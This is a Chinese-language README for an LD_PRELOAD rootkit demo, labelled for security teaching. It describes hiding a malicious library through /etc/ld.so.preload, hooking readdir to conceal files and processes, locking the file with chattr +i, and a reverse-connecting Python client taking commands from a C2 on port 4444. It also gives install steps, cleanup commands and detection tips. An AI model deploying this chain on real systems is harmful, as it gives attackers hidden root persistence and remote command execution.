# LD_PRELOAD Rootkit Demo

> ⚠️ **仅供安全研究 / 教学使用,请在受控的实验环境(虚拟机)中运行,作者与工具无关任何滥用行为。**

一个最小可用的 Linux `LD_PRELOAD` 持久化后门 demo,演示从"植入"到"远控"的完整链路。

## 目录结构

```
rookit-LD-preload/
├── entry.sh              # 一键植入:编译 .so → 写入 ld.so.preload → +i 锁定 → 自删
├── preload_c/            # 用户态 rootkit,劫持 readdir 隐藏自身痕迹
│   ├── preload.c
│   └── Makefile
├── client_py/            # Python 木马本体,反向连接 C2 等指令
│   └── client.py
├── client_cpp/           # C++ 本地版(占位,留空)
└── server_py/            # C2 服务端,开端口等客户端连入
    └── server.py
```

## 核心原理

### 1. `LD_PRELOAD` 持久化
Linux 动态链接器在加载任何动态可执行文件时,**最先**读取 `/etc/ld.so.preload`(或环境变量 `LD_PRELOAD`)中指定的 `.so`。这个机制对所有进程生效,包括 `root` 启动的服务。

把恶意 `.so` 写进 `/etc/ld.so.preload`,就实现了"开机自启 + 难以察觉"的持久化。

### 2. `readdir` 劫持
恶意 `.so` 通过 `dlsym(RTLD_NEXT, "readdir")` 拿到原始 `readdir` 指针,在遍历目录时过滤掉 `ld.so.preload`、`libprocesshider.so` 等关键字,让 `ls`、`find` 都看不到自己。

由于 `/proc` 下的每个进程也是用 `readdir` 列出的,这一招对隐藏文件**和**进程名都有效(对老版本 glibc 有效,新版本 `getdents` 可能需要额外 hook)。

### 3. `chattr +i` 锁死
`chattr +i /etc/ld.so.preload` 给文件加上 **immutable** 属性,即使 `root` 也不能写、不能删、不能改。要清理必须先 `chattr -i`。

### 4. 反弹 shell
`client.py` 上线后等待 C2 下发命令,用 `subprocess` 执行并回传 stdout/stderr,实现任意命令执行后门。

## 使用方法(实验机)

```bash
# 1) 编译 rootkit
cd preload_c && make && cd ..

# 2) 启动 C2(攻击机)
python3 server_py/server.py
# 默认监听 0.0.0.0:4444

# 3) 修改 client_py/client.py 顶部的 HOST 为 C2 地址
# 4) 植入受害机(需要 root)
sudo ./entry.sh

# 5) C2 端即可看到 "client connected",开始下指令
shell@('10.0.0.5', 54321)> id
shell@('10.0.0.5', 54321)> ls /etc/ld.so.preload     # 这里已经看不到了
shell@('10.0.0.5', 54321)> exit
```

## 应急清理

```bash
# 必须先解除 immutable,否则 root 也删不掉
sudo chattr -i /etc/ld.so.preload
sudo rm -f /etc/ld.so.preload /usr/lib/libprocesshider.so

# 关掉反弹 shell 进程
pgrep -f client.py | xargs -r kill -9
```

## 检测思路(防御视角)

- 定期 `cat /etc/ld.so.preload`,正常系统该文件通常**不存在**
- 用 `lsattr /etc/ld.so.preload` 看有没有 `i` 标志
- 静态比对关键 `.so`(`/usr/lib/lib*.so*`)的 hash
- `find` 配合 `stat` 查 `LD_PRELOAD` 来源进程
- 用 `unhide`、`rkhunter` 等工具辅助扫描
